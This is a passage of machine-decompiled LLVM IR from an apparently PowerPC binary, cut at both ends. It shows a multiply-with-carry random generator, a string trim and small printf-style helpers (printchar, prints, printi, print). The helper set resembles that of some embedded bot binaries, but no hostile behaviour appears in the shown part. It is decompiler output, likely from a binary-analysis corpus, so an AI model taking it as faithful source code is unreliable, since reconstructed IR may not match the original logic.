entry:
  %r10.global-to-local = alloca i32, align 4
  store i32 18782, i32* %r10.global-to-local, align 4
  %v3_10000348 = load i32, i32* @global_var_100246b0.13, align 4
  %v1_1000034c = add i32 %v3_10000348, 1
  %v1_10000350 = urem i32 %v1_1000034c, 4096
  store i32 %v1_10000350, i32* @global_var_100246b0.13, align 4
  %v1_1000036c = mul nuw nsw i32 %v1_10000350, 4
  %v2_10000370 = add i32 %v1_1000036c, ptrtoint (i32* @global_var_10024ac8.10 to i32)
  %v1_10000374 = inttoptr i32 %v2_10000370 to i32*
  %v2_10000374 = load i32, i32* %v1_10000374, align 4
  %v6_10000398 = udiv i32 %v2_10000374, 228675
  %v2_1000039c = mul i32 %v2_10000374, 18782
  %v3_100003ac = load i32, i32* @global_var_100246ac.14, align 4
  %v2_100003b8 = add i32 %v3_100003ac, %v2_1000039c
  %v3_100003b8 = icmp ult i32 %v2_100003b8, %v3_100003ac
  %v4_100003bc = zext i1 %v3_100003b8 to i32
  %v5_100003bc = add nuw nsw i32 %v4_100003bc, %v6_10000398
  store i32 %v5_100003bc, i32* %r10.global-to-local, align 4
  %v2_100003ec = add i32 %v5_100003bc, %v2_100003b8
  %v2_10000400 = icmp ult i32 %v2_100003ec, %v5_100003bc
  br i1 %v2_10000400, label %dec_label_pc_10000408, label %dec_label_pc_10000428

dec_label_pc_10000408:                            ; preds = %entry
  %v1_1000040c = add i32 %v2_100003ec, 1
  %v1_1000041c = add nuw nsw i32 %v5_100003bc, 1
  br label %dec_label_pc_10000428

dec_label_pc_10000428:                            ; preds = %entry, %dec_label_pc_10000408
  %storemerge = phi i32 [ %v1_1000041c, %dec_label_pc_10000408 ], [ %v5_100003bc, %entry ]
  %stack_var_-36.0 = phi i32 [ %v1_1000040c, %dec_label_pc_10000408 ], [ %v2_100003ec, %entry ]
  store i32 %storemerge, i32* @global_var_100246ac.14, align 4
  store i32 %v1_10000350, i32* %r10.global-to-local, align 4
  %v2_10000438 = sub i32 -2, %stack_var_-36.0
  store i32 %v2_10000438, i32* %v1_10000374, align 4
  %v0_10000458 = load i32, i32* %r10.global-to-local, align 4
  %v1_10000458 = mul i32 %v0_10000458, 4
  %v2_1000045c = add i32 %v1_10000458, ptrtoint (i32* @global_var_10024ac8.10 to i32)
  %v1_10000460 = inttoptr i32 %v2_1000045c to i32*
  %v2_10000460 = load i32, i32* %v1_10000460, align 4
  ret i32 %v2_10000460

; uselistorder directives
  uselistorder i32 %v5_100003bc, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v3_100003ac, { 1, 0 }
  uselistorder i32 %v2_10000374, { 1, 0 }
  uselistorder i32 %v1_10000350, { 2, 0, 1 }
  uselistorder i32* @global_var_10024ac8.10, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10024ac8.10 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_10000428, { 1, 0 }
}

define i32 @trim(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_1000049c = call i32 @__GI_strlen()
  store i32 %v0_1000049c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100004c0

dec_label_pc_100004b4:                            ; preds = %dec_label_pc_100004c0
  %v1_100004b8 = add i32 %stack_var_-36.0, 1
  br label %dec_label_pc_100004c0

dec_label_pc_100004c0:                            ; preds = %entry, %dec_label_pc_100004b4
  %stack_var_-36.0 = phi i32 [ 0, %entry ], [ %v1_100004b8, %dec_label_pc_100004b4 ]
  %v2_100004cc = add i32 %stack_var_-36.0, %arg1
  %v3_100004cc = inttoptr i32 %v2_100004cc to i8*
  %v3_100004d0 = load i8, i8* %v3_100004cc, align 1
  %v4_100004d0 = zext i8 %v3_100004d0 to i32
  store i32 %v4_100004d0, i32* %r3.global-to-local, align 4
  %v3_100004e0 = call i32 @isspace(i32 %v4_100004d0, i32 %v2_100004cc)
  store i32 %v3_100004e0, i32* %r3.global-to-local, align 4
  %v3_100004e8 = icmp eq i32 %v3_100004e0, 0
  br i1 %v3_100004e8, label %dec_label_pc_10000500.preheader, label %dec_label_pc_100004b4

dec_label_pc_10000500.preheader:                  ; preds = %dec_label_pc_100004c0
  %v1_100004a8 = add i32 %v0_1000049c, -1
  %v2_100005087 = icmp slt i32 %v1_100004a8, %stack_var_-36.0
  br i1 %v2_100005087, label %dec_label_pc_1000058c.preheader, label %dec_label_pc_10000510

dec_label_pc_100004f4:                            ; preds = %dec_label_pc_10000510
  %v1_100004f8 = add i32 %stack_var_-40.010, -1
  %v2_10000508 = icmp slt i32 %v1_100004f8, %stack_var_-36.0
  br i1 %v2_10000508, label %dec_label_pc_1000058c.preheader, label %dec_label_pc_10000510

dec_label_pc_10000510:                            ; preds = %dec_label_pc_10000500.preheader, %dec_label_pc_100004f4
  %stack_var_-40.010 = phi i32 [ %v1_100004f8, %dec_label_pc_100004f4 ], [ %v1_100004a8, %dec_label_pc_10000500.preheader ]
  %v2_1000051c = add i32 %stack_var_-40.010, %arg1
  %v3_1000051c = inttoptr i32 %v2_1000051c to i8*
  %v3_10000520 = load i8, i8* %v3_1000051c, align 1
  %v4_10000520 = zext i8 %v3_10000520 to i32
  store i32 %v4_10000520, i32* %r3.global-to-local, align 4
  %v3_10000530 = call i32 @isspace(i32 %v4_10000520, i32 %v2_1000051c)
  store i32 %v3_10000530, i32* %r3.global-to-local, align 4
  %v3_10000538 = icmp eq i32 %v3_10000530, 0
  br i1 %v3_10000538, label %dec_label_pc_1000058c.preheader, label %dec_label_pc_100004f4

dec_label_pc_1000058c.preheader:                  ; preds = %dec_label_pc_100004f4, %dec_label_pc_10000510, %dec_label_pc_10000500.preheader
  %stack_var_-40.0.lcssa = phi i32 [ %v1_100004a8, %dec_label_pc_10000500.preheader ], [ %v1_100004f8, %dec_label_pc_100004f4 ], [ %stack_var_-40.010, %dec_label_pc_10000510 ]
  %v3_100005943 = icmp sgt i32 %stack_var_-36.0, %stack_var_-40.0.lcssa
  br i1 %v3_100005943, label %dec_label_pc_1000059c, label %dec_label_pc_1000054c

dec_label_pc_1000054c:                            ; preds = %dec_label_pc_1000058c.preheader, %dec_label_pc_1000054c
  %v2_100005b06 = phi i32 [ %v2_100005b0, %dec_label_pc_1000054c ], [ %arg1, %dec_label_pc_1000058c.preheader ]
  %storemerge15 = phi i32 [ %v1_10000584, %dec_label_pc_1000054c ], [ %stack_var_-36.0, %dec_label_pc_1000058c.preheader ]
  %v2_10000570 = add i32 %storemerge15, %arg1
  %v1_10000574 = inttoptr i32 %v2_10000570 to i8*
  %v2_10000574 = load i8, i8* %v1_10000574, align 1
  %v3_1000057c = inttoptr i32 %v2_100005b06 to i8*
  store i8 %v2_10000574, i8* %v3_1000057c, align 1
  %v1_10000584 = add i32 %storemerge15, 1
  %v3_10000594 = icmp sgt i32 %v1_10000584, %stack_var_-40.0.lcssa
  %v2_100005a4 = sub i32 %v1_10000584, %stack_var_-36.0
  %v2_100005b0 = add i32 %v2_100005a4, %arg1
  br i1 %v3_10000594, label %dec_label_pc_1000059c, label %dec_label_pc_1000054c

dec_label_pc_1000059c:                            ; preds = %dec_label_pc_1000054c, %dec_label_pc_1000058c.preheader
  %v2_100005b0.lcssa = phi i32 [ %arg1, %dec_label_pc_1000058c.preheader ], [ %v2_100005b0, %dec_label_pc_1000054c ]
  %v3_100005b8 = inttoptr i32 %v2_100005b0.lcssa to i8*
  store i8 0, i8* %v3_100005b8, align 1
  %v0_100005d0 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100005d0

; uselistorder directives
  uselistorder i32 %v1_10000584, { 2, 1, 0 }
  uselistorder i32 %storemerge15, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_100004a8, { 1, 0, 2 }
  uselistorder i32 %stack_var_-36.0, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 6, 1, 5, 2, 0 }
  uselistorder i32 %arg1, { 5, 1, 2, 0, 3, 4, 6, 7 }
  uselistorder label %dec_label_pc_1000054c, { 1, 0 }
  uselistorder label %dec_label_pc_1000058c.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000510, { 1, 0 }
  uselistorder label %dec_label_pc_100004c0, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_100005e8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-20, align 4
  %v3_100005f4 = icmp eq i32 %v0_100005e8, 0
  br i1 %v3_100005f4, label %dec_label_pc_10000628, label %dec_label_pc_100005fc

dec_label_pc_100005fc:                            ; preds = %entry
  %v1_10000600 = inttoptr i32 %v0_100005e8 to i32*
  %v2_10000600 = load i32, i32* %v1_10000600, align 4
  %v1_1000060c = trunc i32 %arg2 to i8
  %v3_1000060c = inttoptr i32 %v2_10000600 to i8*
  store i8 %v1_1000060c, i8* %v3_1000060c, align 1
  %v2_10000614 = load i32, i32* %v1_10000600, align 4
  %v1_10000618 = add i32 %v2_10000614, 1
  store i32 %v1_10000618, i32* %v1_10000600, align 4
  %v0_10000650.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000063c

dec_label_pc_10000628:                            ; preds = %entry
  %v2_10000628 = ptrtoint i32* %stack_var_-20 to i32
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268437052, i32* @lr, align 4
  %v2_10000638 = call i32 @__libc_write(i32 1, i32 %v2_10000628)
  store i32 %v2_10000638, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000063c

dec_label_pc_1000063c:                            ; preds = %dec_label_pc_100005fc, %dec_label_pc_10000628
  %v0_10000650 = phi i32 [ %v0_10000650.pre, %dec_label_pc_100005fc ], [ %v2_10000638, %dec_label_pc_10000628 ]
  ret i32 %v0_10000650

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000063c, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp46 = icmp slt i32 %arg3, 1
  br i1 %tmp46, label %dec_label_pc_10000718, label %dec_label_pc_10000694

dec_label_pc_10000694:                            ; preds = %entry
  %v2_100006c427 = load i8, i8* %arg2, align 1
  %v3_100006cc30 = icmp eq i8 %v2_100006c427, 0
  br i1 %v3_100006cc30, label %dec_label_pc_100006d4, label %dec_label_pc_100006a8

dec_label_pc_100006a8:                            ; preds = %dec_label_pc_10000694, %dec_label_pc_100006a8
  %v4_100006c032 = phi i32 [ %v1_100006b8, %dec_label_pc_100006a8 ], [ %tmp, %dec_label_pc_10000694 ]
  %stack_var_-20.031 = phi i32 [ %v1_100006ac, %dec_label_pc_100006a8 ], [ 0, %dec_label_pc_10000694 ]
  %v1_100006ac = add i32 %stack_var_-20.031, 1
  %v1_100006b8 = add i32 %v4_100006c032, 1
  %v5_100006bc = inttoptr i32 %v1_100006b8 to i8*
  %v2_100006c4 = load i8, i8* %v5_100006bc, align 1
  %v3_100006cc = icmp eq i8 %v2_100006c4, 0
  br i1 %v3_100006cc, label %dec_label_pc_100006d4, label %dec_label_pc_100006a8

dec_label_pc_100006d4:                            ; preds = %dec_label_pc_100006a8, %dec_label_pc_10000694
  %stack_var_-20.0.lcssa = phi i32 [ 0, %dec_label_pc_10000694 ], [ %v1_100006ac, %dec_label_pc_100006a8 ]
  %v2_100006dc = icmp slt i32 %stack_var_-20.0.lcssa, %arg3
  br i1 %v2_100006dc, label %dec_label_pc_100006f0, label %dec_label_pc_10000700

dec_label_pc_100006f0:                            ; preds = %dec_label_pc_100006d4
  %v2_100006f8 = sub i32 %arg3, %stack_var_-20.0.lcssa
  br label %dec_label_pc_10000700

dec_label_pc_10000700:                            ; preds = %dec_label_pc_100006d4, %dec_label_pc_100006f0
  %storemerge4 = phi i32 [ %v2_100006f8, %dec_label_pc_100006f0 ], [ 0, %dec_label_pc_100006d4 ]
  %v1_10000704 = call i32 @__asm_rlwinm(i32 %arg4, i32 0, i32 30, i32 30)
  %v3_10000708 = icmp eq i32 %v1_10000704, 0
  br i1 %v3_10000708, label %dec_label_pc_10000718, label %dec_label_pc_10000710

dec_label_pc_10000710:                            ; preds = %dec_label_pc_10000700
  br label %dec_label_pc_10000718

dec_label_pc_10000718:                            ; preds = %dec_label_pc_10000700, %entry, %dec_label_pc_10000710
  %stack_var_-32.0 = phi i32 [ %arg3, %entry ], [ %storemerge4, %dec_label_pc_10000700 ], [ %storemerge4, %dec_label_pc_10000710 ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_10000700 ], [ 48, %dec_label_pc_10000710 ]
  %v1_1000071c = urem i32 %arg4, 2
  %v3_10000720 = icmp eq i32 %v1_1000071c, 0
  br i1 %v3_10000720, label %dec_label_pc_10000750.preheader, label %dec_label_pc_10000790.preheader

dec_label_pc_10000750.preheader:                  ; preds = %dec_label_pc_10000718
  %v2_1000075420 = icmp sgt i32 %stack_var_-32.0, 0
  br i1 %v2_1000075420, label %dec_label_pc_1000072c.lr.ph, label %dec_label_pc_10000790.preheader

dec_label_pc_1000072c.lr.ph:                      ; preds = %dec_label_pc_10000750.preheader
  %v2_10000734 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_1000072c

dec_label_pc_1000072c:                            ; preds = %dec_label_pc_1000072c.lr.ph, %dec_label_pc_1000072c
  %stack_var_-32.123 = phi i32 [ %stack_var_-32.0, %dec_label_pc_1000072c.lr.ph ], [ %v1_10000748, %dec_label_pc_1000072c ]
  %v3_10000734 = call i32 @printchar(i32* %v2_10000734, i32 %stack_var_-16.0)
  %v1_10000748 = add nsw i32 %stack_var_-32.123, -1
  %v2_10000754 = icmp sgt i32 %stack_var_-32.123, 1
  br i1 %v2_10000754, label %dec_label_pc_1000072c, label %dec_label_pc_10000790.preheader

dec_label_pc_10000790.preheader:                  ; preds = %dec_label_pc_1000072c, %dec_label_pc_10000750.preheader, %dec_label_pc_10000718
  %stack_var_-12.1.ph = phi i32 [ 0, %dec_label_pc_10000718 ], [ 0, %dec_label_pc_10000750.preheader ], [ %stack_var_-32.0, %dec_label_pc_1000072c ]
  %stack_var_-32.2.ph = phi i32 [ %stack_var_-32.0, %dec_label_pc_10000718 ], [ %stack_var_-32.0, %dec_label_pc_10000750.preheader ], [ 0, %dec_label_pc_1000072c ]
  %v2_1000079411 = load i8, i8* %arg2, align 1
  %v3_1000079c14 = icmp eq i8 %v2_1000079411, 0
  br i1 %v3_1000079c14, label %dec_label_pc_100007cc.preheader, label %dec_label_pc_10000760.lr.ph

dec_label_pc_10000760.lr.ph:                      ; preds = %dec_label_pc_10000790.preheader
  %v2_10000774 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_10000760

dec_label_pc_10000760:                            ; preds = %dec_label_pc_10000760.lr.ph, %dec_label_pc_10000760
  %v4_1000079017 = phi i32 [ %tmp, %dec_label_pc_10000760.lr.ph ], [ %v1_10000788, %dec_label_pc_10000760 ]
  %stack_var_-36.016 = phi i8* [ %arg2, %dec_label_pc_10000760.lr.ph ], [ %v5_1000078c, %dec_label_pc_10000760 ]
  %stack_var_-12.115 = phi i32 [ %stack_var_-12.1.ph, %dec_label_pc_10000760.lr.ph ], [ %v1_1000077c, %dec_label_pc_10000760 ]
  %v2_10000764 = load i8, i8* %stack_var_-36.016, align 1
  %v3_10000764 = zext i8 %v2_10000764 to i32
  %v3_10000774 = call i32 @printchar(i32* %v2_10000774, i32 %v3_10000764)
  %v1_1000077c = add i32 %stack_var_-12.115, 1
  %v1_10000788 = add i32 %v4_1000079017, 1
  %v5_1000078c = inttoptr i32 %v1_10000788 to i8*
  %v2_10000794 = load i8, i8* %v5_1000078c, align 1
  %v3_1000079c = icmp eq i8 %v2_10000794, 0
  br i1 %v3_1000079c, label %dec_label_pc_100007cc.preheader, label %dec_label_pc_10000760

dec_label_pc_100007cc.preheader:                  ; preds = %dec_label_pc_10000760, %dec_label_pc_10000790.preheader
  %stack_var_-12.1.lcssa = phi i32 [ %stack_var_-12.1.ph, %dec_label_pc_10000790.preheader ], [ %v1_1000077c, %dec_label_pc_10000760 ]
  %v2_100007d06 = icmp sgt i32 %stack_var_-32.2.ph, 0
  br i1 %v2_100007d06, label %dec_label_pc_100007a8.lr.ph, label %dec_label_pc_100007d8

dec_label_pc_100007a8.lr.ph:                      ; preds = %dec_label_pc_100007cc.preheader
  %v2_100007b0 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_100007a8

dec_label_pc_100007a8:                            ; preds = %dec_label_pc_100007a8.lr.ph, %dec_label_pc_100007a8
  %stack_var_-32.39 = phi i32 [ %stack_var_-32.2.ph, %dec_label_pc_100007a8.lr.ph ], [ %v1_100007c4, %dec_label_pc_100007a8 ]
  %v3_100007b0 = call i32 @printchar(i32* %v2_100007b0, i32 %stack_var_-16.0)
  %v1_100007c4 = add nsw i32 %stack_var_-32.39, -1
  %v2_100007d0 = icmp sgt i32 %stack_var_-32.39, 1
  br i1 %v2_100007d0, label %dec_label_pc_100007a8, label %dec_label_pc_100007cc.dec_label_pc_100007d8_crit_edge

dec_label_pc_100007cc.dec_label_pc_100007d8_crit_edge: ; preds = %dec_label_pc_100007a8
  %tmp47 = add i32 %stack_var_-12.1.lcssa, %stack_var_-32.2.ph
  br label %dec_label_pc_100007d8

dec_label_pc_100007d8:                            ; preds = %dec_label_pc_100007cc.dec_label_pc_100007d8_crit_edge, %dec_label_pc_100007cc.preheader
  %stack_var_-12.2.lcssa = phi i32 [ %tmp47, %dec_label_pc_100007cc.dec_label_pc_100007d8_crit_edge ], [ %stack_var_-12.1.lcssa, %dec_label_pc_100007cc.preheader ]
  ret i32 %stack_var_-12.2.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-12.1.lcssa, { 1, 0 }
  uselistorder i32 %v1_10000788, { 1, 0 }
  uselistorder i32 %stack_var_-32.0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %stack_var_-20.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_100006b8, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100007a8, { 1, 0 }
  uselistorder label %dec_label_pc_10000760, { 1, 0 }
  uselistorder label %dec_label_pc_1000072c, { 1, 0 }
  uselistorder label %dec_label_pc_10000718, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000700, { 1, 0 }
  uselistorder label %dec_label_pc_100006a8, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %v3_10000844 = icmp eq i32 %arg2, 0
  br i1 %v3_10000844, label %dec_label_pc_1000084c, label %dec_label_pc_10000880

dec_label_pc_1000084c:                            ; preds = %entry
  store i32 48, i32* %stack_var_-88, align 4
  %v4_10000870 = bitcast i32* %stack_var_-88 to i8*
  %v5_10000870 = call i32 @prints(i32 %arg1, i8* %v4_10000870, i32 %arg5, i32 %arg6)
  br label %dec_label_pc_100009d8

dec_label_pc_10000880:                            ; preds = %entry
  %v3_10000884 = icmp eq i32 %arg4, 0
  br i1 %v3_10000884, label %dec_label_pc_100008b8, label %dec_label_pc_1000088c

dec_label_pc_1000088c:                            ; preds = %dec_label_pc_10000880
  %v3_10000890 = icmp eq i32 %arg3, 10
  br i1 %v3_10000890, label %dec_label_pc_10000898, label %dec_label_pc_100008b8

dec_label_pc_10000898:                            ; preds = %dec_label_pc_1000088c
  %tmp27 = icmp sgt i32 %arg2, -1
  br i1 %tmp27, label %dec_label_pc_100008b8, label %dec_label_pc_100008a4

dec_label_pc_100008a4:                            ; preds = %dec_label_pc_10000898
  %v1_100008b0 = sub i32 0, %arg2
  br label %dec_label_pc_100008b8

dec_label_pc_100008b8:                            ; preds = %dec_label_pc_1000088c, %dec_label_pc_10000898, %dec_label_pc_10000880, %dec_label_pc_100008a4
  %stack_var_-44.0 = phi i32 [ %arg2, %dec_label_pc_10000880 ], [ %arg2, %dec_label_pc_10000898 ], [ %v1_100008b0, %dec_label_pc_100008a4 ], [ %arg2, %dec_label_pc_1000088c ]
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_10000880 ], [ 0, %dec_label_pc_10000898 ], [ 1, %dec_label_pc_100008a4 ], [ 0, %dec_label_pc_1000088c ]
  %tmp28 = bitcast i32* %stack_var_-77 to i8*
  store i8 0, i8* %tmp28, align 4
  %v3_100009445 = icmp eq i32 %stack_var_-44.0, 0
  br i1 %v3_100009445, label %dec_label_pc_1000094c, label %dec_label_pc_100008d0.lr.ph

dec_label_pc_100008d0.lr.ph:                      ; preds = %dec_label_pc_100008b8
  %v2_10000900 = add i32 %arg7, -58
  br label %dec_label_pc_100008d0

dec_label_pc_100008d0:                            ; preds = %dec_label_pc_100008d0.lr.ph, %dec_label_pc_1000090c
  %stack_var_-44.17 = phi i32 [ %stack_var_-44.0, %dec_label_pc_100008d0.lr.ph ], [ %v2_10000938, %dec_label_pc_1000090c ]
  %stack_var_-28.06 = phi i8* [ %tmp28, %dec_label_pc_100008d0.lr.ph ], [ %v5_10000914, %dec_label_pc_1000090c ]
  %v2_100008d8 = urem i32 %stack_var_-44.17, %arg3
  %tmp29 = icmp slt i32 %v2_100008d8, 10
  br i1 %tmp29, label %dec_label_pc_1000090c, label %dec_label_pc_100008f8

dec_label_pc_100008f8:                            ; preds = %dec_label_pc_100008d0
  %v1_10000904 = add i32 %v2_10000900, %v2_100008d8
  br label %dec_label_pc_1000090c

dec_label_pc_1000090c:                            ; preds = %dec_label_pc_100008d0, %dec_label_pc_100008f8
  %stack_var_-32.0 = phi i32 [ %v2_100008d8, %dec_label_pc_100008d0 ], [ %v1_10000904, %dec_label_pc_100008f8 ]
  %v4_1000090c = ptrtoint i8* %stack_var_-28.06 to i32
  %v1_10000910 = add i32 %v4_1000090c, -1
  %v5_10000914 = inttoptr i32 %v1_10000910 to i8*
  %fold = add i32 %stack_var_-32.0, 48
  %v1_1000092c = trunc i32 %fold to i8
  store i8 %v1_1000092c, i8* %v5_10000914, align 1
  %v2_10000938 = udiv i32 %stack_var_-44.17, %arg3
  %v3_10000944 = icmp ult i32 %stack_var_-44.17, %arg3
  br i1 %v3_10000944, label %dec_label_pc_1000094c, label %dec_label_pc_100008d0

dec_label_pc_1000094c:                            ; preds = %dec_label_pc_1000090c, %dec_label_pc_100008b8
  %stack_var_-28.0.lcssa = phi i8* [ %tmp28, %dec_label_pc_100008b8 ], [ %v5_10000914, %dec_label_pc_1000090c ]
  %v3_10000950 = icmp eq i32 %stack_var_-36.0, 0
  br i1 %v3_10000950, label %dec_label_pc_100009b4, label %dec_label_pc_10000958

dec_label_pc_10000958:                            ; preds = %dec_label_pc_1000094c
  %v3_1000095c = icmp eq i32 %arg5, 0
  br i1 %v3_1000095c, label %dec_label_pc_1000099c, label %dec_label_pc_10000964

dec_label_pc_10000964:                            ; preds = %dec_label_pc_10000958
  %v1_10000968 = call i32 @__asm_rlwinm(i32 %arg6, i32 0, i32 30, i32 30)
  %v3_1000096c = icmp eq i32 %v1_10000968, 0
  br i1 %v3_1000096c, label %dec_label_pc_1000099c, label %dec_label_pc_10000974

dec_label_pc_10000974:                            ; preds = %dec_label_pc_10000964
  %v2_1000097c = inttoptr i32 %arg1 to i32*
  %v3_1000097c = call i32 @printchar(i32* %v2_1000097c, i32 45)
  %v1_10000990 = add i32 %arg5, -1
  br label %dec_label_pc_100009b4

dec_label_pc_1000099c:                            ; preds = %dec_label_pc_10000964, %dec_label_pc_10000958
  %v4_1000099c = ptrtoint i8* %stack_var_-28.0.lcssa to i32
  %v1_100009a0 = add i32 %v4_1000099c, -1
  %v5_100009a4 = inttoptr i32 %v1_100009a0 to i8*
  store i8 45, i8* %v5_100009a4, align 1
  br label %dec_label_pc_100009b4

dec_label_pc_100009b4:                            ; preds = %dec_label_pc_1000094c, %dec_label_pc_10000974, %dec_label_pc_1000099c
  %stack_var_-28.1 = phi i8* [ %stack_var_-28.0.lcssa, %dec_label_pc_1000094c ], [ %v5_100009a4, %dec_label_pc_1000099c ], [ %stack_var_-28.0.lcssa, %dec_label_pc_10000974 ]
  %stack_var_-56.0 = phi i32 [ %arg5, %dec_label_pc_1000094c ], [ %arg5, %dec_label_pc_1000099c ], [ %v1_10000990, %dec_label_pc_10000974 ]
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_1000094c ], [ 0, %dec_label_pc_1000099c ], [ 1, %dec_label_pc_10000974 ]
  %v5_100009c4 = call i32 @prints(i32 %arg1, i8* %stack_var_-28.1, i32 %stack_var_-56.0, i32 %arg6)
  %v2_100009d0 = add i32 %v5_100009c4, %stack_var_-40.0
  br label %dec_label_pc_100009d8

dec_label_pc_100009d8:                            ; preds = %dec_label_pc_1000084c, %dec_label_pc_100009b4
  %storemerge = phi i32 [ %v2_100009d0, %dec_label_pc_100009b4 ], [ %v5_10000870, %dec_label_pc_1000084c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-28.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_10000914, { 0, 2, 1 }
  uselistorder i32 %v2_100008d8, { 1, 0, 2 }
  uselistorder i32 %stack_var_-44.17, { 0, 2, 1 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 3, 0, 2, 4 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 2, 4, 1, 3, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100009d8, { 1, 0 }
  uselistorder label %dec_label_pc_100009b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000090c, { 1, 0 }
  uselistorder label %dec_label_pc_100008d0, { 1, 0 }
  uselistorder label %dec_label_pc_100008b8, { 3, 1, 0, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg3 to i8*
  %tmp41 = ptrtoint i32* %arg1 to i32
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-68.427 = inttoptr i32 %arg2 to i8*
  %v2_10000fc828 = load i8, i8* %stack_var_-68.427, align 1
  %v3_10000fd031 = icmp eq i8 %v2_10000fc828, 0
  br i1 %v3_10000fd031, label %dec_label_pc_10000fd8, label %dec_label_pc_10000a24.lr.ph

dec_label_pc_10000a24.lr.ph:                      ; preds = %entry
  %v1_10000b98 = add i32 %arg3, 4
  %v2_10000b98 = inttoptr i32 %v1_10000b98 to i32*
  %v1_10000b60 = add i32 %arg3, 8
  %v2_10000b60 = inttoptr i32 %v1_10000b60 to i32*
  %v4_10000f7c = bitcast i32* %stack_var_-88 to i8*
  br label %dec_label_pc_10000a24

dec_label_pc_10000a24:                            ; preds = %dec_label_pc_10000a24.lr.ph, %dec_label_pc_10000fb8
  %stack_var_-68.434 = phi i8* [ %stack_var_-68.427, %dec_label_pc_10000a24.lr.ph ], [ %stack_var_-68.4, %dec_label_pc_10000fb8 ]
  %stack_var_-68.4.in33 = phi i32 [ %arg2, %dec_label_pc_10000a24.lr.ph ], [ %v1_10000fbc, %dec_label_pc_10000fb8 ]
  %stack_var_-56.132 = phi i32 [ 0, %dec_label_pc_10000a24.lr.ph ], [ %stack_var_-56.0, %dec_label_pc_10000fb8 ]
  %v2_10000a28 = load i8, i8* %stack_var_-68.434, align 1
  %v3_10000a30 = icmp eq i8 %v2_10000a28, 37
  br i1 %v3_10000a30, label %dec_label_pc_10000a38, label %dec_label_pc_10000f94

dec_label_pc_10000a38:                            ; preds = %dec_label_pc_10000a24
  %v1_10000a3c = add i32 %stack_var_-68.4.in33, 1
  %v5_10000a40 = inttoptr i32 %v1_10000a3c to i8*
  %v2_10000a58 = load i8, i8* %v5_10000a40, align 1
  %v3_10000a60 = icmp eq i8 %v2_10000a58, 0
  br i1 %v3_10000a60, label %dec_label_pc_10000fd8, label %dec_label_pc_10000a68

dec_label_pc_10000a68:                            ; preds = %dec_label_pc_10000a38
  %v2_10000a6c = load i8, i8* %v5_10000a40, align 1
  %v3_10000a74 = icmp eq i8 %v2_10000a6c, 37
  br i1 %v3_10000a74, label %dec_label_pc_10000f94, label %dec_label_pc_10000a7c

dec_label_pc_10000a7c:                            ; preds = %dec_label_pc_10000a68
  %v2_10000a80 = load i8, i8* %v5_10000a40, align 1
  %v3_10000a88 = icmp eq i8 %v2_10000a80, 45
  br i1 %v3_10000a88, label %dec_label_pc_10000a90, label %dec_label_pc_10000ac0.preheader

dec_label_pc_10000a90:                            ; preds = %dec_label_pc_10000a7c
  %v1_10000a94 = add i32 %stack_var_-68.4.in33, 2
  %v5_10000a98 = inttoptr i32 %v1_10000a94 to i8*
  br label %dec_label_pc_10000ac0.preheader

dec_label_pc_10000ac0.preheader:                  ; preds = %dec_label_pc_10000a90, %dec_label_pc_10000a7c
